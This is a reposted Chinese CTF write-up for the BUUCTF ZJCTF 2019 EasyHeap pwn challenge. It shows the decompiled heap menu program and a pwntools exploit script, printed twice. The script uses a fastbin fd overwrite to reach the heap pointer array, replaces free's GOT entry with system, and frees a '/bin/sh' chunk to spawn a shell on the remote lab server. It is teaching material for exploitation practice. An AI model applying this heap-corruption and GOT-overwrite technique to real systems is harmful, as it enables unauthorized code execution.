# Buuctf刷题记录-ZJCTF 2019 EasyHeap

> 原文: https://www.ctfiot.com/286402.html
> ID: 286402

int__fastcall __noreturnmain(intargc,constchar**argv,constchar**envp){intv3;// eaxcharbuf[8];// [rsp+0h] [rbp-10h] BYREFunsigned__int64 v5;// [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u);setvbuf(stdout,0LL,2,0LL);setvbuf(stdin,0LL,2,0LL);while(1) {while(1) {menu();read(0, buf,8uLL); v3 =atoi(buf);if( v3 !=3)break;delete_heap(); }if( v3 >3) {if( v3 ==4)exit(0);if( v3 ==4869) {if( (unsigned__int64)magic <=0x1305) {puts("So sad !"); }else {puts("Congrt !");l33t(); } }else {LABEL_17:puts("Invalid Choice"); } }elseif( v3 ==1) {create_heap(); }else {if( v3 !=2)gotoLABEL_17;edit_heap(); } }}

intmenu(){puts("--------------------------------");puts(" Easy Heap Creator ");puts("--------------------------------");puts(" 1. Create a Heap ");puts(" 2. Edit a Heap ");puts(" 3. Delete a Heap ");puts(" 4. Exit ");puts("--------------------------------");returnprintf("Your choice :");}

unsigned__int64create_heap(){inti;// [rsp+4h] [rbp-1Ch]size_tsize;// [rsp+8h] [rbp-18h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v4;// [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u);for( i =0; i <=9; ++i ) {if( !*(&heaparray + i) ) {printf("Size of Heap : ");read(0, buf,8uLL); size =atoi(buf); *(&heaparray + i) =malloc(size);if( !*(&heaparray + i) ) {puts("Allocate Error");exit(2); }printf("Content of heap:");read_input(*(&heaparray + i), size);puts("SuccessFul");return__readfsqword(0x28u) ^ v4; } }return__readfsqword(0x28u) ^ v4;}

unsigned__int64edit_heap(){intv1;// [rsp+4h] [rbp-1Ch] __int64 v2;// [rsp+8h] [rbp-18h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v4;// [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u);printf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( (unsignedint)v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( *(&heaparray + v1) ) {printf("Size of Heap : ");read(0, buf,8uLL); v2 =atoi(buf);printf("Content of heap : ");read_input(*(&heaparray + v1), v2);puts("Done !"); }else {puts("No such heap !"); }return__readfsqword(0x28u) ^ v4;}

unsigned__int64delete_heap(){intv1;// [rsp+Ch] [rbp-14h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v3;// [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u);printf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( (unsignedint)v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( *(&heaparray + v1) ) {free(*(&heaparray + v1)); *(&heaparray + v1) =0LL;puts("Done !"); }else {puts("No such heap !"); }return__readfsqword(0x28u) ^ v3;}

intl33t(){returnsystem("cat /home/pwn/flag");}

frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./easyheap')elf = ELF("./easyheap")io=remote("node5.buuoj.cn",28812)#gdb.attach(io,'b *0x400CAE')defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())allocate(0x60,b'aaa')allocate(0x60,b'aaa')free(1)#magic = 0x00000000006020C0payload =b'a'*0x68+ p64(0x71) + p64(0x6020ad)fill(0,payload)allocate(0x60,b'/bin/shx00')#heaparray = 0x6020e0payload =b'a'*0x23+ p64(elf.got["free"])allocate(0x60,payload)payload = p64(elf.plt["system"])fill(0,payload)free(1)io.interactive()

allocate(0x60,b'aaa')allocate(0x60,b'aaa')

free(1)

payload = b'a'*0x68 + p64(0x71) + p64(0x6020ad)fill(0,payload)

allocate(0x60,b'/bin/shx00')payload=b'a'*0x23+p64(elf.got["free"])allocate(0x60,payload)

payload = p64(elf.plt["system"])fill(0,payload)

free(1)io.interactive()

看雪ID：G0t1T

https://bbs.kanxue.com/user-home-1002337.htm

*本文为看雪论坛优秀文章，由G0t1T原创，转载请注明来自看雪社区

# 往期推荐

从ANGR-CTF项目入手ANGR和符号执行技术

AI时代-逆向工作者该如何用好这一利器

EXIF解析缓冲区溢出漏洞分析与利用

从C到Pwn：栈溢出漏洞利用实战入门

Android-ARM64的VMP分析和还原

球分享

球点赞

球在看

点击阅读原文查看更多


```
int__fastcall __noreturnmain(intargc,constchar**argv,constchar**envp){intv3;// eaxcharbuf[8];// [rsp+0h] [rbp-10h] BYREFunsigned__int64 v5;// [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u);setvbuf(stdout,0LL,2,0LL);setvbuf(stdin,0LL,2,0LL);while(1) {while(1) {menu();read(0, buf,8uLL); v3 =atoi(buf);if( v3 !=3)break;delete_heap(); }if( v3 >3) {if( v3 ==4)exit(0);if( v3 ==4869) {if( (unsigned__int64)magic <=0x1305) {puts("So sad !"); }else {puts("Congrt !");l33t(); } }else {LABEL_17:puts("Invalid Choice"); } }elseif( v3 ==1) {create_heap(); }else {if( v3 !=2)gotoLABEL_17;edit_heap(); } }}
```



```
intmenu(){puts("--------------------------------");puts(" Easy Heap Creator ");puts("--------------------------------");puts(" 1. Create a Heap ");puts(" 2. Edit a Heap ");puts(" 3. Delete a Heap ");puts(" 4. Exit ");puts("--------------------------------");returnprintf("Your choice :");}
```



```
unsigned__int64create_heap(){inti;// [rsp+4h] [rbp-1Ch]size_tsize;// [rsp+8h] [rbp-18h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v4;// [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u);for( i =0; i <=9; ++i ) {if( !*(&heaparray + i) ) {printf("Size of Heap : ");read(0, buf,8uLL); size =atoi(buf); *(&heaparray + i) =malloc(size);if( !*(&heaparray + i) ) {puts("Allocate Error");exit(2); }printf("Content of heap:");read_input(*(&heaparray + i), size);puts("SuccessFul");return__readfsqword(0x28u) ^ v4; } }return__readfsqword(0x28u) ^ v4;}
```



```
unsigned__int64edit_heap(){intv1;// [rsp+4h] [rbp-1Ch] __int64 v2;// [rsp+8h] [rbp-18h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v4;// [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u);printf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( (unsignedint)v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( *(&heaparray + v1) ) {printf("Size of Heap : ");read(0, buf,8uLL); v2 =atoi(buf);printf("Content of heap : ");read_input(*(&heaparray + v1), v2);puts("Done !"); }else {puts("No such heap !"); }return__readfsqword(0x28u) ^ v4;}
```



```
unsigned__int64delete_heap(){intv1;// [rsp+Ch] [rbp-14h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v3;// [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u);printf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( (unsignedint)v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( *(&heaparray + v1) ) {free(*(&heaparray + v1)); *(&heaparray + v1) =0LL;puts("Done !"); }else {puts("No such heap !"); }return__readfsqword(0x28u) ^ v3;}
```



```
intl33t(){returnsystem("cat /home/pwn/flag");}
```



```
frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./easyheap')elf = ELF("./easyheap")io=remote("node5.buuoj.cn",28812)#gdb.attach(io,'b *0x400CAE')defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())allocate(0x60,b'aaa')allocate(0x60,b'aaa')free(1)#magic = 0x00000000006020C0payload =b'a'*0x68+ p64(0x71) + p64(0x6020ad)fill(0,payload)allocate(0x60,b'/bin/shx00')#heaparray = 0x6020e0payload =b'a'*0x23+ p64(elf.got["free"])allocate(0x60,payload)payload = p64(elf.plt["system"])fill(0,payload)free(1)io.interactive()
```



```
allocate(0x60,b'aaa')allocate(0x60,b'aaa')
```



```
free(1)
```



```
payload = b'a'*0x68 + p64(0x71) + p64(0x6020ad)fill(0,payload)
```



```
allocate(0x60,b'/bin/shx00')payload=b'a'*0x23+p64(elf.got["free"])allocate(0x60,payload)
```



```
payload = p64(elf.plt["system"])fill(0,payload)
```



```
free(1)io.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765365102-wxsync-2025-12-36b69825120a5d8142abe589e3c24ec4.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765365103-wxsync-2025-12-242aebb801c563650047f8f3732000ee.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765365105-wxsync-2025-12-7b12828187553d2cf5753b8751acb009.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765365107-wxsync-2025-12-65a4641f7146ac4496d2df8b8991e40f.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765365108-wxsync-2025-12-d343c8563f64c88e411d1a0889de4045.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765365110-wxsync-2025-12-e78b2f197486a81e45298df3ca60e3cd.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765365111-wxsync-2025-12-a65151dff4c7b276532de1fbc6d25431.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765365113-wxsync-2025-12-3a738769b275326e6c8c182f038a3c1b.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765365114-wxsync-2025-12-ee9bcec0bfcdbd521053913dfb800df8.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765365116-wxsync-2025-12-d5da7d7b841b76df4b2749c75d9918d6.jpg)